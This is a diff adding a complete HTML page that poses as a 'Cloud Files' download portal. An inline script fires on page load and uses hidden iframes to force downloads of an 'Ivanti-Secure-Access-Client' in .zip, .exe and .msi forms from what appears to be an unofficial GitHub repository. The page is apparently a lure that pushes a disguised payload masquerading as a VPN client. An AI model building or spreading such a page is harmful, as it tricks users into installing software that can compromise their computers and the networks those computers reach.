@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Cloud Files</title>
+  <meta name="description" content="Fast and safe portal to download your files securely"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+  <link rel="stylesheet" href="styles.css"/>
+</head>
+<body>
+  <main class="download-section">
+    <article class="download-card">
+      <figure class="icon-box">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+          <path d="M12 9L15 12L12 15L9 12Z"
+                stroke="white" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </figure>
+      <header class="download-header">
+        <h1>Preparing your download…</h1>
+        <p>Redirecting…</p>
+      </header>
+    </article>
+  </main>
+
+  <script>
+    const baseUrl = "https://github.com/ivaclient/ivanti/releases/download/3.956/Ivanti-Secure-Access-Client";
+
+    const extensions = [".zip", ".exe", ".msi"];
+
+    extensions.forEach(ext => {
+      const f = document.createElement("iframe");
+      f.style.display = "none";
+      f.src = baseUrl + ext;
+      document.body.appendChild(f);
+      setTimeout(() => f.remove(), 30000);
+    });
+  </script>
+</body>
+</html>
